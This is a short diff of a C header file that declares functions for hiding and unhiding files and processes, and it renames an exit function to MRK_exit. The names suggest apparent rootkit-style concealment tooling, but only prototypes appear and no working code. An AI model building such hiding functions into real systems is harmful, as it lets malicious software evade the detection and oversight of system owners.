@@ -7,6 +7,6 @@ int unhide_file(const char *path_name);
 int hide_process(const char *exec_file_path);
 int unhide_process(const char *exec_file_path);
 
-int exit_func(const char *_);
+void MRK_exit(void);
 
 #endif  /* MAIN_H */
